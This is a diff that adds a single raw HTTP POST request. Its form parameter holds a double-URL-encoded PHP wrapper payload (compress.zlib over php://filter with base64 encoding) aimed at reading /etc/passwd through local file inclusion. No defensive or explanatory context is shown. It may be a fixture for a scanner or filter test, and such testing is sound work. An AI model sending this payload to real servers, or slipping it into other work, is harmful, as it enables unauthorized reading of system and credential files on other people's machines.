@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 126
+Connection: close
+
+s=compress.zlib%253A%252F%252Fphp%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253D%252Fetc%252Fpasswd
